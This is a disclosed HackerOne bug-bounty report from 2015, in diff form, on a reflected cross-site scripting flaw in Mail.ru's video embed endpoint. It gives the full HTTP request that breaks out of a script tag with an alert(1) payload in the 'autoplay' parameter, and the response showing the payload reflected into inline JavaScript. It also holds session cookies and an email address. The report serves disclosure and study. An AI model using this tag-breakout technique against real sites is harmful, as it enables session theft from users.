@@ -1,0 +1,72 @@
+ReportLink:https://hackerone.com/reports/13302
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 11:58:55
+
+Summary:
+
+Тэг скрипт за собой прикрываешь, и поехали писать свое :)
+
+GET /videos/embed/corp/lady/602/1171.html?autoplay=1745ba<%2fscript><script>alert(1)<%2fscript>14f95&rbAdvertismentSlotOverride=5485&wmode=opaque HTTP/1.1
+Host: api.video.mail.ru
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://lady.mail.ru/video/290-kak-sdelat-ukrashenie-iz-repsovoj-lenty/
+Cookie: video_key=418effd5e09f0b9e64583b6464623e404138d9c9; p=b0kAAEt9twAA; mref=http://my.mail.ru/video/top; mrcu=A6505381CD6669AD68F68DC71B5F; searchuid=1527834891401015703; HTML5Uploader=2; gmt=4; posts_subscriptions=isox@inbox.ru; VID=0Mm8Po3iv9HE:; _ga=GA1.2.49844597.1401016323; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAQCuwcA; current-page=month; mr1ladid=1_1000000_1000164_0; sdc=ZkNtEiOYcuxI9KMD; Mpop=1401016718:767444037873097519050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; c=69GBUwEAAJoEAAAkAAAACQAg; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; s=s_vp=(2560/1279)|fver=13|dpr=1; _ym_visorc_9569476=w; __utma=41676084.49844597.1401016323.1401016976.1401016976.1; __utmb=41676084.1.10.1401016976; __utmc=41676084; __utmz=41676084.1401016976.1.1.utmcsr=my.mail.ru|utmccn=(referral)|utmcmd=referral|utmcct=/my/userinfo; mc1=1401016982; i=AQCizYFTBQATAAgKA0IBAdwEAfQEAagACAcCBQABvgABqgAIBwIFAAG+AAHvAQgEAQEAASoCBQIBAA==
+
+
+
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 25 May 2014 13:41:59 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1938
+Connection: close
+Status: 200 OK
+Set-Cookie: video_key=418effd5e09f0b9e64583b6464623e404138d9c9; domain=.video.mail.ru; path=/; expires=Mon, 26-May-2014 13:41:59 GMT
+Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate
+Pragma: no-cache
+Expires: Fri, 29 Aug 1997 02:14:00 EST
+Last-Modified: Sun, 25 May 2014 13:41:59 GMT
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title> :: video.mail.ru</title>
+    <script type="text/javascript">
+        document.domain = "mail.ru";
+    </script>
+    <script type="text/javascript">
+      var flashVars = {"autoplay":"1745ba</script><script>alert(1)</script>14f95","rbAdvertismentSlotOverride":"5485","movieSrc":"corp/lady/602/1171","locationHref":"http%3A%2F%2Flady.mail.ru%2Fvideo%2F290-kak-sdelat-ukrashenie-iz-repsovoj-lenty%2F","host":"","referrer":"http%3A%2F%2Flady.mail.ru%2Fvideo%2F290-kak-sdelat-ukrashenie-iz-repsovoj-lenty%2F"},
+        videoParams = {"autoplay":"1745ba</script><script>alert(1)</script>14f95","rbAdvertismentSlotOverride":"5485","movieSrc":"corp/lady/602/1171","locationHref":"http%3A%2F%2Flady.mail.ru%2Fvideo%2F290-kak-sdelat-ukrashenie-iz-repsovoj-lenty%2F","host":"","referrer":"http%3A%2F%2Flady.mail.ru%2Fvideo%2F290-kak-sdelat-ukrashenie-iz-repsovoj-lenty%2F"},
+        wmode = "opaque",
+        videoSrc = "http://api.video.mail.ru/file/video/hv/corp/lady/602/1171",
+        accid = 49748853,
+        providerId = "mm",
+        adSlot = 5485,
+        version = 1,
+        isPrivate = false,
+        swfVersion = "18",
+        cssVideoRetinaVersion = "9",
+        videoPresets = {"sd":"http://api.video.mail.ru/file/video/v/corp/lady/602/1171","md":"http://api.video.mail.ru/file/video/hv2/corp/lady/602/1171","full_hd":"http://api.video.mail.ru/file/video/hv/corp/lady/602/1171"},
+        externalLocation = "http://lady.mail.ru";
+    </script>
+    <link rel="stylesheet" type="text/css" href="http://my10.imgsmail.ru/mail/ru/css/video_player_iframe_33.css" />
+    <link rel="stylesheet" type="text/css" href="http://my10.imgsmail.ru/mail/ru/css/new/html5-video_33.css" />
+  </head>
+  <body>
+
+    
+    <script type="text/javascript" src="http://my10.imgsmail.ru/mail/ru/images/js/external-video/out/player.min_33.js"></script>
+    
+    
+  </body>
+</html>
